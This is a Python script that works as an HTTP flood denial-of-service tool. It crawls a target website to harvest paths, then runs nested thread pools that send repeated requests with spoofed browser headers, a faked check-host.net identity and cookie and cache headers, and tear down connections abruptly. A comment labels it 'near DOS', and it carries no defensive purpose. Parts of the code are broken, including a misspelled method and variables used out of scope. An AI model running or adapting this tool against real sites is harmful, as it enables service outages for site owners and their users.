import threading,socket,ssl,random,string,struct,sys,requests,time
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urlparse

def generate_url_path(char_set=string.ascii_letters + string.digits + string.punctuation + "กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ๐๑๒๓๔๕๖๗๘๙",num=1):
    return "".join(random.choices(char_set, k=num))

def get_target(url2):
    parsed_url = urlparse(url2.rstrip())
    return {
        'uri': parsed_url.path or '/',
        'host': parsed_url.netloc,
        'scheme': parsed_url.scheme,
        'port': parsed_url.port or ('443' if parsed_url.scheme == 'https' else '80'),
        'normal': url2
    }

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'

def sock_build(target):
   s = socket.create_connection((target['host'], int(target['port'])))
   s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
   s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
   if int(target['port']) == 443:
    s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])
   return s

def pkt(packet_raw,options=""):
   import re
   from user_agents import parse
   parsed_ua = parse(user_agent)
   os_version_match = re.search(r"\d+(\.\d+)*", parsed_ua.os.version_string)
   os_version = os_version_match.group(0) if os_version_match else "unknown"
   client_hints = [
        f'Sec-CH-UA: "{parsed_ua.browser.family}";v="{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Arch: "x86"' if "Win64" in user_agent or "x86_64" in user_agent else 'Sec-CH-UA-Arch: "arm64"' if "arm" in user_agent.lower() else 'Sec-CH-UA-Arch: "unknown"',
        f'Sec-CH-UA-Bitness: "64"' if "Win64" in user_agent or "x86_64" in user_agent else 'Sec-CH-UA-Bitness: "32"',
        f'Sec-CH-UA-Full-Version: "{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Full-Version-List: "{parsed_ua.browser.family}";v="{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Mobile: "?1"' if parsed_ua.is_mobile else 'Sec-CH-UA-Mobile: "?0"',
        f'Sec-CH-UA-Model: "{parsed_ua.device.family}"' if parsed_ua.is_mobile else 'Sec-CH-UA-Model: ""',
        f'Sec-CH-UA-Platform: "{parsed_ua.os.family}"',
        f'Sec-CH-UA-Platform-Version: "{os_version}"',
    ]
   return f"{packet_raw[1]} {packet_raw[0]} HTTP/1.1\r\nHost: {target['host']}\r\nReferer: {target['normal']}\r\nUpgrade-Insecure-Requests: 1\r\nDnt: 1\r\nPriority: u=0, i\r\nUser-Agent: {user_agent}\r\n{'\r\n'.join(client_hints)}\r\nAccept: */*\r\nAccept-Language: *\r\nAccept-Encoding: *\r\nTe: trailers\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1{options}\r\n\r\n".encode()

def reply_recheck(data):
 try:
  head_server_reply = data.split(b'\r\n\r\n')[0].decode()
  cookies = {}
  If_Modified_Since = None
  If_None_Match = None
  for a in head_server_reply.split('\r\n'):
   if a.startswith("ETag:"):
    If_None_Match = a.split(":", 1)[1].strip()
   if a.startswith("Last-Modified:"):
      If_Modified_Since = a.split(":", 1)[1].strip()
   if a.startswith("Set-Cookie:"):
        cookie_data = a.split(":", 1)[1].strip()
        cookie_parts = cookie_data.split(";")
        name, value = cookie_parts[0].split("=", 1)
        cookies[name.strip()] = value.strip()
  cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
  options = [cookie_header,If_Modified_Since,If_None_Match]
  headers_more = []
  if len(options[0]) != 0:headers_more.append(f'Cookie: {options[0]}')
  if len(options[1]) != 0:headers_more.append(f'If-Modified-Since: {options[1]}')
  if len(options[2]) != 0:headers_more.append(f'If-None-Match: {options[2]}')
  if len(headers_more) != 0:
   return '\r\n'+'\r\n'.join(headers_more)
 except:pass
 return ""

def Rapid_sender(target,s,packet_raw,paths):
   for _ in range(500):
     try:
        for _ in range(500):
           s.sendall(pkt(packet_raw))
           options = reply_recheck(s.recv())
           for a in paths:
              s.sendall(pkt([a,meth],options))
              options_cached = reply_recheck(s.recv())
              if len(options_cached) != 0 and len(options) != 0:options = options_cached
           s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 0, 1))
        s.shutdown(socket.SHUT_RDWR)
        s.close()
     except:pass
     s = sock_build(target)

def fast_thread_pool(target,meth,n_threads,path):
   for _ in range(500):
      with ThreadPoolExecutor(max_workers=n_threads) as executor:list(executor.submit(Rapid_sender,target,sock_build(target),[target['uri'],meth],paths) for i in range(n_threads))

url,thread,meth = '',0,''

try:
   url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
   target = get_target(url)
except (IndexError, ValueError):print("WELCOME TO TOOL")

def trace_link(data,links,path,target,protocols,headers):
    thread_append = []
    for tag_set in data:
      for tag in tag_set:
        try:
            for attr in ('href', 'src'):
                if attr in tag.attrs:
                    link = tag[attr]
                    if link and (link.startswith('https://') or link.startswith('http://')):
                        link_get = urlparse(link).hostname
                        if link_get in target:
                         if link not in links:links.append(link)
                         p = urlparse(link).path
                         if p not in path:path.append(p)
                         t = threading.Thread(target=query_link,args=(link, link_search,path,target,protocols,header))
                         t.start()
                         thread_append.append(t)
                    else:
                       if target in link:
                          if link.startswith("//"):
                             link_set = 'https:'+link
                             p = urlparse(link_set).path
                             if link_set not in links:
                              links.append(link_set)
                             if p not in path:path.append(p)
                             t = threading.Thread(target=query_link,args=(link_set, link_search,path,target,protocols,header))
                             t.start()
                             thread_append.append(t)
                       elif link.startswith('/') == False:
                             s = f'https://{target}/{link}'
                             if s not in link:
                                links.append(s)
                             if link not in path:
                                path.append(link)
                             t = threading.Thread(target=query_link,args=(s, link_search,path,target,protocols,header))
                             t.start()
                             thread_append.append(t)
                       else:
                             s = f'https://{target}{link}'
                             if s not in link:
                                links.append(s)
                             if '/'+link not in path:path.append('/'+link)
                             t = threading.Thread(target=query_link,args=(s, link_search,path,target,protocols,header))
                             t.start()
                             thread_append.append(t)
        except Exception as e:
            print(e)
    for a in thread_append:
       a.join()

blacklist_path = []
def query_link(url, link, path, target,protocols, header):
    global blacklist_path
    try:
        if url.startswith("//"):
           if "http" not in url and url.startswtih(':') == False:url = f'{protocols}:'+url
           elif "http" not in url and url.startswtih(':') == True:url = f'{protocols}'+url
        elif url.startswith('/'):
           if 'http' not in url and url.startswith(':') == False:url = f'{protocols}://{target}{url}'
        else:
           if 'http' not in url and url.startswith(':') == False:url = f'{protocols}://{target}/{url}'
        if url not in blacklist_path:
         blacklist_path.append(url)
         soup = BeautifulSoup(requests.get(url, timeout=35, headers=header).text, "html.parser")
         t = threading.Thread(target=trace_link,args=((soup.find_all(href=True),soup.find_all(src=True)),link,path,target,protocols,header))
         t.start()
         t.join()
    except:pass

header = {"User-Agent": "CheckHost (https://check-host.net/)",'Accept-Encoding':'gzip, deflate','Referer': f'https://check-host.net/check-report/{generate_url_path(string.ascii_lowercase+string.digits,12)}','Te':'trailers'}
paths = []
link_search = []
query_link(url,link_search,paths, target['host'],target['scheme'], header) # DEEP QUERY NEAR DOS
paths = [path if path.startswith('/') or path.startswith('mailto:') or path.startswith('data:image/png;base64') else '/' + path for path in list(set(paths))]
paths.insert(0,target['uri'])
print(paths)
for _ in range(thread):
   with ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.submit(fast_thread_pool, target,meth,thread,paths) for i in range(10))